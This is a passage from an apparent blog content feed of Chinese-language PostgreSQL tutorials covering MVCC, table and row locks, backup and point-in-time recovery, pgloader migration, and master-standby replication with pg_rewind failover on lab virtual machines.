class="string">&#x27;铃铛&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">select</span> xmin,xmax,<span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="comment">--9、提交事务</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>事务B：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 右，事务B</span></span><br><span class="line"><span class="comment">--4、开启事务</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">--5、查询某一行数据,  xmin = 630,xmax = 0</span></span><br><span class="line"><span class="keyword">select</span> xmin,xmax,<span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="comment">--6、每次开启事务后，会分配一个事务ID 事务id=632</span></span><br><span class="line"><span class="keyword">select</span> txid_current();</span><br><span class="line"><span class="comment">--8、事务A修改完，事务B再查询  xmin = 630  xmax = 631</span></span><br><span class="line"><span class="keyword">select</span> xmin,xmax,<span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="comment">--10、事务A提交后，事务B再查询  xmin = 631  xmax = 0</span></span><br><span class="line"><span class="keyword">select</span> xmin,xmax,<span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">8</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL中的锁</title>
    <url>/2024/10/12/20241012-02.html</url>
    <content><![CDATA[<p>PostgreSQL中主要有两种锁，一个表锁，一个行锁。</p>
<p>PostgreSQL中也提供了页锁，咨询锁，但不需要关注，只是为了锁的完整性。</p>
<h1 id="表锁"><a href="#表锁" class="headerlink" title="表锁"></a>表锁</h1><p>表锁显而易见，就是锁住整张表。</p>
<p>表锁也分为很多种模式，其中最核心的两个：</p>
<ul>
<li>ACCESS SHARE：共享锁（读锁），读读操作不阻塞，但是不允许出现写操作并行；</li>
<li>ACCESS EXCLUSIVE：互斥锁（写锁），无论什么操作进来，都阻塞。</li>
</ul>
<p>具体的可以查看官网文档：<a href="http://postgres.cn/docs/12/explicit-locking.html">http://postgres.cn/docs/12/explicit-locking.html</a></p>
<p>表锁的实现：</p>
<p><img src="/./assets/20241012/5c734cd1b43e49d89c7089286d1c493b.png" alt="表锁语法"></p>
<p>就是基于LOCK开启表锁，指定表的名字name，其次在MODE中指定锁的模式，NOWAIT可以指定是否在没有拿到锁时，一直等待。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1号连接</span></span><br><span class="line"><span class="comment">-- 基于互斥锁，锁住test表</span></span><br><span class="line"><span class="comment">-- 先开启事务</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">-- 基于默认的ACCESS EXCLUSIVE锁住test表</span></span><br><span class="line">lock test <span class="keyword">in</span> ACCESS SHARE mode;</span><br><span class="line"><span class="comment">-- 操作</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;</span><br><span class="line"><span class="comment">-- 提交事务，锁释放</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<p>当1号连接基于事务开启后，锁住当前表之后，如果使用默认的ACCESS EXCLUSIVE，其他连接操作表时，会直接阻塞住。</p>
<p>如果1号是基于ACCESS SHARE共享锁时，其他线程查询当前表是不会锁住的。</p>
<h1 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h1><p>PostgreSQL的行锁和MySQL的基本是一模一样的，基于select for update就可以指定行锁。</p>
<p>MySQL中有一个概念，for update时，如果select的查询没有命中索引，可能会锁表。</p>
<p>PostgerSQL有个特点，一般情况，在select的查询没有命中索引时，他不一定会锁表，依然会实现行锁。</p>
<p>PostgreSQL的行锁，就两个，一个for update，一个for share。</p>
<p>在开启事务之后，直接执行select * from table where 条件 for update;</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 先开启事务</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">-- 基于for update 锁住id为3的数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;v1&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">-- 提交事务，锁释放</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<p>其他的连接要操作当前行，会阻塞住。</p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL的备份与恢复</title>
    <url>/2024/10/12/20241012-03.html</url>
    <content><![CDATA[<p>防止数据丢失的第一道防线就是备份。数据丢失有的是硬件损坏，还有人为的误删之类的，也有其他的原因导致误删数据。</p>
<p>正常备份和恢复，如果公司有DBA，开发一般不用参与，但作为架构师还是要了解。</p>
<p>在PostgreSQL中，有三种备份方式：</p>
<p><strong>SQL备份（逻辑备份）</strong> ：其实就是利用数据库自带的类似dump的命令，或者是你用图形化界面执行导入导出时，底层就是基于这个dump命令实现的。</p>
<p>优点：简单，操作方便还可靠。</p>
<p>缺点：数据数据量比较大的时候，这种方式巨慢，可能导出一天，都无法导出所有数据。</p>
<p><strong>文件系统备份（物理备份）</strong> ：其实就是找到当前数据库，数据文件在磁盘存储的位置，将数据文件直接复制一份或多份，存储在不同的物理机上，即便物理机故障，还有其他物理机。</p>
<p>优点：相比逻辑备份，恢复的速度快。</p>
<p>缺点：在备份数据时，可能数据还正在写入，一定程度上会丢失数据。 在恢复数据时，也需要注意数据库的版本和环境必须保持高度的一致。如果是线上正在运行的数据库，这种复制的方式无法在生产环境实现。</p>
<p><strong>如果说要做数据的迁移，这种方式还不错滴。</strong></p>
<p><strong>归档备份：（也属于物理备份）</strong></p>
<p>先了解几个概念，在PostgreSQL有多个子进程来辅助一些操作：</p>
<ul>
<li>BgWriter进程：BgWriter是将内存中的数据写到磁盘中的一个辅助进程。当向数据库中执行写操作后，数据不会马上持久化到磁盘里。这个主要是为了提升性能。BgWriter会周期性的将内存中的数据写入到磁盘。<ul>
<li>如果快了，IO操作频繁，效率慢；</li>
<li>如果慢了，有查询操作需要内存中的数据时，需要BgWriter现把数据从内存写到磁盘中，再提供给查询操作作为返回结果，会导致查询操作效率变低；</li>
<li>考虑一个问题： <strong>事务提交了，数据没落到磁盘，这时，服务器宕机了怎么办？</strong></li>
</ul>
</li>
<li>WalWriter进程：WAL就是write ahead log的缩写，说人话就是预写日志（redo log）。其实数据还在内存中时，其实已经写入到WAL日志中一份，这样一来，即便BgWriter进程没写入到磁盘中时，数据也不会丢失。<ul>
<li>WAL能单独做备份么？单独不行！</li>
<li>但是WAL日志有个问题，这个日志会循环使用，WAL日志有大小的线程，只能保存指定时间的日志信息，如果超过了，会覆盖之前的日志。</li>
</ul>
</li>
<li>PgArch进程：WAL日志会循环使用，数据会丢失。没关系，还有一个归档的进程，会在切换wal日志前，将WAL日志备份出来。PostgreSQL也提供了一个全量备份的操作。可以根据WAL日志，选择一个事件点，进行恢复。</li>
</ul>
<p>查看WAL日志：</p>
<p><img src="/./assets/20241012/d79b1442bef340b5926929de9e850b5e.png" alt="查看WAL日志文件列表"></p>
<p>这些就是归档日志。</p>
<blockquote>
<p>wal日志的名称，是三块内容组成，</p>
<p>没8个字符分成一组，用16进制标识的</p>
<p>00000001 00000000 0000000A</p>
<p>时间线    逻辑id    物理id</p>
</blockquote>
<p>查询当前库用的是哪个wal日志：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看当前使用的wal日志  查询到的lsn：0/47233270</span></span><br><span class="line"><span class="keyword">select</span> pg_current_wal_lsn();</span><br><span class="line"><span class="comment">-- 基于lsn查询具体的wal日志名称  000000010000000000000047</span></span><br><span class="line"><span class="keyword">select</span> pg_walfile_name(<span class="string">&#x27;0/47233270&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>归档默认不是开启的，需要手动开启归档操作，才能保证wal日志的完整性</p>
<p>修改postgresql.conf文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启wal日志的内容，注释去掉即可</span><br><span class="line">wal_level = replica</span><br><span class="line">fsync = on</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241012/c6208a5990ad498d8d12bb993ce61eb0.png" alt="postgresql.conf开启归档wal"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启归档操作</span><br><span class="line">archive_mode = on</span><br><span class="line"># 修改一小下命令，修改存放归档日志的路径</span><br><span class="line">archive_command = &#x27;test ! -f /archive/%f &amp;&amp; cp %p /archive/%f&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241012/a84bfa1e23914bacbd2c0f0f0fc4bed9.png" alt="postgresql.conf开启归档"></p>
<p><strong>修改完上述配置文件后，记得重启postgreSQL进程，才会生效！</strong></p>
<p>归档操作执行时，需要保证&#x2F;archive存在，并且postgres用户有权限进行w操作</p>
<p>构建&#x2F;archive路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># postgres没有权限在/目录下构建目录</span></span><br><span class="line"><span class="comment"># 切换到root，构建目录，将目录的拥有者更改为postgres</span></span><br><span class="line"><span class="built_in">mkdir</span> /archive</span><br><span class="line"><span class="built_in">chown</span> -R postgres. archive</span><br></pre></td></tr></table></figure>

<p>在当前库中做大量写操作，接入到wal日志，重置切换wal日志，再查看归档情况。</p>
<p>发现，将当前的正在使用的wal日志和最新的上一个wal日志归档过来了，但是之前的没归档。</p>
<p>这个不是问题，后期备份时，会执行命令，这个命令会直接要求wal日志立即归档，然后最全量备份。</p>
<h1 id="逻辑备份-恢复"><a href="#逻辑备份-恢复" class="headerlink" title="逻辑备份&amp;恢复"></a>逻辑备份&amp;恢复</h1><p>PostgreSQL提供了pg_dump以及pg_dumpall的命令来实现逻辑备份。</p>
<p>这两命令差不多，看名字猜！</p>
<p>pg_dump这种备份，不会造成用户对数据的操作出现阻塞。</p>
<p>数据库不是很大的时候，pg_dump也不是不成！</p>
<p>查看命令使用帮助：</p>
<p><img src="/./assets/20241012/019b3eb2967f42aba79b20f5630b030b.png" alt="pg_dump命令使用帮助"></p>
<p>这个命令从三块去看：<a href="http://postgres.cn/docs/12/app-pgdump.html">http://postgres.cn/docs/12/app-pgdump.html</a></p>
<ul>
<li>连接的信息，指定连接哪个库，用哪个用户~</li>
<li>option的信息有就点多，查看官网。</li>
<li>备份的数据库！</li>
</ul>
<p>备份库中的全部数据。</p>
<p><img src="/./assets/20241012/bd17eea943bb469abf49c08eda67777b.png" alt="备份整个数据库"></p>
<p>删除当前数据库中的表等信息，然后恢复数据</p>
<p><img src="/./assets/20241012/3dfb7ccdb7f44d129d12afbcd201f68f.png" alt="恢复整个数据库"></p>
<p>除此之外，也可以通过图形化界面备份，在库的位置点击备份就成，导出一个文本文件。</p>
<h1 id="物理备份（归档-物理）"><a href="#物理备份（归档-物理）" class="headerlink" title="物理备份（归档+物理）"></a>物理备份（归档+物理）</h1><p>这里需要基于前面的文件系统的备份和归档备份实现最终的操作</p>
<p>单独使用文件系统的方式不推荐，因为数据会丢失。</p>
<p>这里直接使用PostgreSQL提供的pg_basebackup命令来实现。</p>
<p>pg_basebackup会做两个事情：</p>
<ul>
<li>将内存中的脏数据落到磁盘中，然后将数据全部备份；</li>
<li>将wal日志直接做归档，然后将归档也备走。</li>
</ul>
<p>查看pg_basebackup命令使用帮助：</p>
<p><img src="/./assets/20241012/edbd4c4ac2484a77804e6f8e6e8252dd.png" alt="pg_basebackup命令使用帮助"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -D 指定备份文件的存储位置</span></span><br><span class="line"><span class="comment"># -Ft 备份文件打个包</span></span><br><span class="line"><span class="comment"># -Pv 输出备份的详细信息</span></span><br><span class="line"><span class="comment"># -U 用户名（要拥有备份的权限）</span></span><br><span class="line"><span class="comment"># -h ip地址  -p 端口号</span></span><br><span class="line"><span class="comment"># -R 复制写配置文件</span></span><br><span class="line">pg_basebackup -D /pg_basebackup -Ft -Pv -Upostgres -h 192.168.11.32 -p 5432 -R</span><br></pre></td></tr></table></figure>

<ul>
<li>提前准备出&#x2F;pg_basebackup目录（将拥有者赋予postgres用户）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /pg_basebackup</span><br><span class="line">chown -R postgres. /pg_basebackup/</span><br></pre></td></tr></table></figure></li>
<li>给postgres用户提供replication的权限，修改pg_hba.conf，记得重启生效<br><img src="/./assets/20241012/d074286b7e8c441e83af33deab5e443c.png" alt="pg_hba.conf给postgres用户提供replication的权限"></li>
<li>执行备份<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pg_basebackup -D /pg_basebackup -Ft -Pv -Upostgres -h 192.168.11.32 -p 5432 -R</span><br></pre></td></tr></table></figure></li>
<li>需要输入postgres的密码，这里可以设置，重新备份。<br><img src="/./assets/20241012/48497030a29c4e5db466129b8f2ab88a.png" alt="重新备份"></li>
<li>执行备份<br><img src="/./assets/20241012/17fa8dca9aa341a6912d5ff6d61d7dab.png" alt="执行备份"><br><img src="/./assets/20241012/acfd93a923f141638b05786cc4577252.png" alt="备份结果"></li>
</ul>
<h1 id="物理恢复（归档-物理）"><a href="#物理恢复（归档-物理）" class="headerlink" title="物理恢复（归档+物理）"></a>物理恢复（归档+物理）</h1><p>模拟数据库崩盘，先停止postgresql服务，然后直接删掉data目录下的全部内容</p>
<p><img src="/./assets/20241012/25e9ac006b994c319e3b690392e4936b.png" alt="模拟数据库崩溃"></p>
<p>将之前备份的两个文件准备好，一个base.tar，一个pg_wal.tar</p>
<p>第一步：将base.tar中的内容，全部解压到 <strong>12&#x2F;data</strong> 目录下</p>
<p>第二步：将pg_wal.tar中的内容，全部解压到 <strong>&#x2F;archive</strong> 目录下</p>
<p><img src="/./assets/20241012/279edaa10c064b4bbd4bc4cd13092bd0.png" alt="解压备份文件"></p>
<p>第三步：在postgresql.auto.conf文件中，指定归档文件的存储位置，以及恢复数据的方式</p>
<p><img src="/./assets/20241012/da544c2ef4cb4c6bbb93b72ed9f2e73f.png" alt="修改postgresql.auto.conf"></p>
<p>第四步：启动postgresql服务</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">systemctl <span class="keyword">start</span> postgresql<span class="number">-12</span></span><br></pre></td></tr></table></figure>

<p>第五步：启动后，发现查询没问题，但是执行写操作时发现不让写。需要执行一个函数，取消这种恢复数据后的状态，才允许正常的执行写操作。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_wal_replay_resume();</span><br></pre></td></tr></table></figure>

<h1 id="物理备份-恢复（PITR-Point-in-time-Recovery）"><a href="#物理备份-恢复（PITR-Point-in-time-Recovery）" class="headerlink" title="物理备份&amp;恢复（PITR-Point in time Recovery）"></a>物理备份&amp;恢复（PITR-Point in time Recovery）</h1><h2 id="模拟场景"><a href="#模拟场景" class="headerlink" title="模拟场景"></a>模拟场景</h2><blockquote>
<p>场景：每天凌晨02:00，开始做全备（PBK），到了第二天，如果有人14:00分将数据做了误删，希望将数据恢复到14:00分误删之前的状态？</p>
</blockquote>
<p>1、恢复全备数据，使用PBK的全备数据恢复到凌晨02:00的数据。（数据会丢失很多）</p>
<p>2、归档恢复：备份中的归档，有02:00~14:00之间的额数据信息，可以基于归档日志将数据恢复到指定的事务id或者是指定时间点，从而实现数据的完整恢复。</p>
<h2 id="准备场景和具体操作"><a href="#准备场景和具体操作" class="headerlink" title="准备场景和具体操作"></a>准备场景和具体操作</h2><p>1、构建一张t3表查询一些数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 构建一张表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t3 (id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t3 <span class="keyword">values</span> (<span class="number">1</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t3 <span class="keyword">values</span> (<span class="number">11</span>);</span><br></pre></td></tr></table></figure>

<p>2、模拟凌晨2点开始做全备操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pg_basebackup -D /pg_basebackup -Ft -Pv -Upostgres -h 192.168.11.32 -p 5432 -R</span><br></pre></td></tr></table></figure>

<p>3、再次做一些写操作，然后误删数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 凌晨2点已经全备完毕</span></span><br><span class="line"><span class="comment">-- 模拟第二天操作</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t3 <span class="keyword">values</span> (<span class="number">111</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t3 <span class="keyword">values</span> (<span class="number">1111</span>);</span><br><span class="line"><span class="comment">-- 误删操作  2023年3月20日20:13:26</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> t3;</span><br></pre></td></tr></table></figure>

<p>4、恢复数据（确认有归档日志）</p>
<p>将当前服务的数据全部干掉，按照之前的全备恢复的套路先走着</p>
<p><img src="/./assets/20241012/2835a0281f83452c8b5dabd1da64089d.png" alt="模拟数据库崩溃"></p>
<p>然后将全备的内容中的base.tar扔data目录下，归档日志也扔到&#x2F;archive位置。</p>
<p>5、查看归档日志，找到指定的事务id</p>
<p>查看归档日志，需要基于postgresql提供的一个命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果命令未找到，说明两种情况，要么没有这个可执行文件，要么是文件在，没设置环境变量</span><br><span class="line"># 咱们这是后者</span><br><span class="line">pg_waldump</span><br><span class="line"># 也可以采用全路径的方式</span><br><span class="line">/usr/pgsql-12/bin/pg_waldump</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241012/74af32dd0a3b489cb0ac37fe1e97bf7d.png" alt="查看备份文件内容"></p>
<p><img src="/./assets/20241012/d4a24917de794f86beba7142495b4854.png" alt="找到对应的事务ID"></p>
<p>6、修改data目录下的恢复数据的方式</p>
<p>修改postgresql.auto.conf文件</p>
<p>将之前的最大恢复，更换为指定的事务id恢复</p>
<p>基于提供的配置例子，如何指定事务id</p>
<p><img src="/./assets/20241012/171f414c5bbb440c8816db7e2474636d.png" alt="如何指定事务ID"></p>
<p>修改postgresql.auto.conf文件指定好事务ID</p>
<p><img src="/./assets/20241012/4cd883970f4a427dbc644c327d54187c.png" alt="指定事务ID"></p>
<p>7、启动postgreSQL服务，查看是否恢复到指定事务ID</p>
<p><img src="/./assets/20241012/71496e35b68e4c069c00b53d5cafbe1c.png" alt="查看恢复结果"></p>
<p>8、记得执行会后的函数，避免无法执行写操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select pg_wal_replay_resume();</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL数据迁移工具——pgloader</title>
    <url>/2024/10/12/20241012-04.html</url>
    <content><![CDATA[<p>PostgreSQL做数据迁移的插件非常多，可以从MySQL迁移到PostgreSQL，也可以基于其他数据源迁移到PostgreSQL。</p>
<p>这种迁移的插件很多，这里只以pgloader举例，pgloader使用起来特别的方便。</p>
<p>以MySQL数据迁移到PostgreSQL为例，分为几个操作：</p>
<p>1、准备MySQL服务（防火墙问题，远程连接问题，权限问题）</p>
<p>准备了一个数据库，里面大概有26W条左右的数据。</p>
<p>2、准备PostgreSQL的服务</p>
<p>3、安装pgloader</p>
<p>pgloader可以安装在任何位置，比如安装在MySQL所在服务，或者PostgreSQL所在服务，再或者一个独立的服务都可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用root用户下载</span></span><br><span class="line">yum -y install pgloader</span><br></pre></td></tr></table></figure>

<p>4、准备pgloader需要的脚本文件</p>
<p>官方文档： <a href="https://pgloader.readthedocs.io/en/latest/">https://pgloader.readthedocs.io/en/latest/</a></p>
<p>注意：PostgreSQL的数据库要提前构建好才可以。</p>
<p><img src="/./assets/20241012/bd2da947a0e44ed1bfbef08a3f576dc6.png" alt="PGLOADER脚本"></p>
<p>5、执行脚本，完成数据迁移</p>
<p>先确认pgloader命令可以使用</p>
<p><img src="/./assets/20241012/2d963c672b4c4847bf0c5187d48a0aea.png" alt="PGLOADER命令测试"></p>
<p>执行脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pgloader 刚刚写好的脚本文件</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241012/56bebeef0f02497aaaa27fa5664c3142.png" alt="PGLOADER执行"></p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL主从同步</title>
    <url>/2024/10/12/20241012-05.html</url>
    <content><![CDATA[<p>PostgreSQL自身只支持简单的主从，没有主从自动切换，仿照类似Nginx的效果一样，采用keepalived的形式，在主节点宕机后，通过脚本的执行完成主从切换。</p>
<h1 id="主从实现（异步流复制）"><a href="#主从实现（异步流复制）" class="headerlink" title="主从实现（异步流复制）"></a>主从实现（异步流复制）</h1><p>操作方式类似与之前的备份和恢复</p>
<h2 id="准备环境："><a href="#准备环境：" class="headerlink" title="准备环境："></a>准备环境：</h2><table>
<thead>
<tr>
<th>角色</th>
<th>IP</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>Master</td>
<td>192.168.11.66</td>
<td>5432</td>
</tr>
<tr>
<td>Standby</td>
<td>192.168.11.67</td>
<td>5432</td>
</tr>
</tbody></table>
<p>准备两台虚拟机，完成上述的环境准备</p>
<p>修改好ip，安装好postgresql服务</p>
<h2 id="给主准备一些数据"><a href="#给主准备一些数据" class="headerlink" title="给主准备一些数据"></a>给主准备一些数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t1 (id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 <span class="keyword">values</span> (<span class="number">111</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1;</span><br></pre></td></tr></table></figure>

<h2 id="配置主节点信息（主从都配置，因为后面会有主从切换的操作）"><a href="#配置主节点信息（主从都配置，因为后面会有主从切换的操作）" class="headerlink" title="配置主节点信息（主从都配置，因为后面会有主从切换的操作）"></a>配置主节点信息（主从都配置，因为后面会有主从切换的操作）</h2><p>修改pg_hba.conf文件</p>
<p><img src="/./assets/20241012/a0f7502d42f5409e988cb646277ef2b1.png" alt="主节点pg_hba.conf"></p>
<p>修改postgresql.conf文件</p>
<p><img src="/./assets/20241012/2359919acb5f4182b3c1fe82e08e5e9f.png" alt="主节点postgresql.conf"></p>
<p>提前构建好归档日志和备份目录，并且设置好拥有者</p>
<p><img src="/./assets/20241012/1921cb7b27644fc39b4c776113257dcd.png" alt="准备归档目录"></p>
<p>重启PostgreSQL服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart postgresql-12</span><br></pre></td></tr></table></figure>

<h2 id="从节点加入到主节点"><a href="#从节点加入到主节点" class="headerlink" title="从节点加入到主节点"></a>从节点加入到主节点</h2><p>关闭从节点服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop postgresql-12</span><br></pre></td></tr></table></figure>

<p>删除从节点数据（删除data目录）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf ~/12/data/*</span><br></pre></td></tr></table></figure>

<p>基于pbk去主节点备份数据</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确认好备份的路径，还有主节点的ip</span></span><br><span class="line">pg_basebackup -D /pgbasebackup -Ft -Pv -Upostgres -h 192.168.11.66 -p 5432 -R</span><br></pre></td></tr></table></figure>

<p>恢复数据操作，解压tar包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /pgbasebackuo</span><br><span class="line">tar -xf base.tar -C ~/12/data</span><br><span class="line">tar -xf pg_wal.tar -C /archive</span><br></pre></td></tr></table></figure>

<p>修改postgresql.auto.conf文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 确认有这两个配置，一般第一个需要手写，第二个会自动生成</span><br><span class="line">restore_command = &#x27;cp /archive/%f %p&#x27;</span><br><span class="line">primary_conninfo = &#x27;user=postgres password=postgres host=192.168.11.66 port=5432 sslmode=prefer sslcompression=0 gssencmode=prefer krbsrvname=postgres target_session_attrs=any&#x27;</span><br></pre></td></tr></table></figure>

<p>修改standby.signal文件，开启从节点备份模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启从节点备份</span><br><span class="line">standby_mode = &#x27;on&#x27;</span><br></pre></td></tr></table></figure>

<p>启动从节点服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart postgresql-12</span><br></pre></td></tr></table></figure>

<p>查看主从信息</p>
<ul>
<li>查看从节点是否有t1表</li>
<li>主节点添加一行数据，从节点再查询，可以看到最新的数据</li>
<li>从节点无法完成写操作，他是只读模式</li>
<li>主节点查看从节点信息<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from pg_stat_replication</span><br></pre></td></tr></table></figure></li>
<li>从节点查看主节点信息<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from pg_stat_wal_receiver</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="主从切换（不推荐）"><a href="#主从切换（不推荐）" class="headerlink" title="主从切换（不推荐）"></a>主从切换（不推荐）</h1><p>其实主从的本质就是从节点去主节点不停的备份新的数据。</p>
<p>配置文件的系统其实就是两个：</p>
<ul>
<li>standby.signal文件，这个是从节点开启备份</li>
<li>postgresql.auto.conf文件，这个从节点指定主节点的地址信息</li>
</ul>
<p>切换就是原主追加上述配置，原从删除上述配追</p>
<p>1、主从节点全部stop停止：</p>
<p>2、原从删除上述配置：</p>
<p>3、原从新主启动服务：</p>
<p>4、原主新从去原从新主备份一次数据：pg_basebackup操作，同时做解压，然后修改postgresql.conf文件以及standby.signal配置文件</p>
<p>5、启动原主新从查看信息</p>
<h1 id="主从故障切换"><a href="#主从故障切换" class="headerlink" title="主从故障切换"></a>主从故障切换</h1><p>默认情况下，这里的主从备份是异步的，导致一个问题，如果主节点写入的数据还没有备份到从节点，主节点忽然宕机了，导致后面如果基于上述方式实现主从切换，数据可能丢失。</p>
<p>PGSQL在9.5版本后提供了一个pg_rewind的操作，基于归档日志帮咱们做一个比对，比对归档日志，是否有时间差冲突。</p>
<p>实现操作：</p>
<p>1、rewind需要开启一项配置才可以使用</p>
<p>修改postgresql.conf中的 <strong>wal_log_hints &#x3D; ‘on’</strong></p>
<p>2、为了可以更方便的使用rewind，需要设置一下 <strong>&#x2F;usr&#x2F;pgsql-12&#x2F;bin&#x2F;</strong> 的环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/profile</span><br><span class="line">  追加信息</span><br><span class="line">  export PATH=/usr/pgsql-12/bin/:$PATH</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>3、模拟主库宕机，直接对主库关机</p>
<p>4、从节点切换为主节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 因为他会去找$PGDATA，我没配置，就基于-D指定一下PGSQL的data目录</span><br><span class="line">pg_ctl promote -D ~/12/data/</span><br></pre></td></tr></table></figure>

<p>5、将原主节点开机，执行命令，搞定归档日志的同步</p>
<ul>
<li>启动虚拟机</li>
<li>停止PGSQL服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pg_ctl stop -D ~/12/data</span><br></pre></td></tr></table></figure></li>
<li>基于pg_rewind加入到集群<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pg_rewind -D ~/12/data/ --source-server=&#x27;host=192.168.11.66 user=postgres password=postgres&#x27;</span><br></pre></td></tr></table></figure></li>
<li>如果上述命令失败，需要启动再关闭PGSQL，并且在执行，完成归档日志的同步<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pg_ctl start -D ~/12/data</span><br><span class="line">pg_ctl stop -D ~/12/data</span><br><span class="line">pg_rewind -D ~/12/data/ --source-server=&#x27;host=192.168.11.66 user=postgres password=postgres&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>6、修改新从节点的配置，然后启动</p>
<ul>
<li>构建standby.signal<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">standby_mode = &#x27;on&#x27;</span><br></pre></td></tr></table></figure></li>
